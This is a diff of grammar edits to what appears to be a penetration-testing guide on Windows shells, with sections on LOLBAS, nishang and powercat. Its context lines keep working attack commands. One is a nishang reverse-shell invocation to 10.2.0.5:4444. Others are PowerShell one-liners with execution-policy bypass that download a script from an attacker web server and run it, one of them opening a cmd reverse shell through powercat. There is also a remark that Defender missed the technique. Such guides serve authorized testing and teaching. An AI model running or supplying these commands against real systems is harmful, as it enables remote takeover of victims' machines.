@@ -17,8 +17,8 @@
 </details>
 
 
-The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) for linux.  
-Obviously **there isn't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be \(ab\)used perform some kind of unexpected actions like **execute arbitrary code.**
+The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.  
+Obviously, **there aren't SUID files or sudo privileges in Windows**, but it's useful to know **how** some **binaries** can be \(ab\)used to perform some kind of unexpected actions like **execute arbitrary code.**
 
 # NC
 
@@ -457,13 +457,13 @@ Payload written on disk: **WebDAV client local cache**
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-In the **Shells** folder there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_ make a copy of the script, append to the end of the file:
+In the **Shells** folder, there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_ make a copy of the script and append to the end of the file:
 
 ```text
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
 
-Start serving the script in a web server and execute in the victim:
+Start serving the script in a web server and execute it on the victim's end:
 
 ```text
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
@@ -477,7 +477,7 @@ Defender doesn't detect it as malicious code \(yet, 3/04/2019\).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Download, start web server, star listener and execute in victim:
+Download, start a web server, start the listener, and execute it on the victim's end:
 
 ```text
  powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
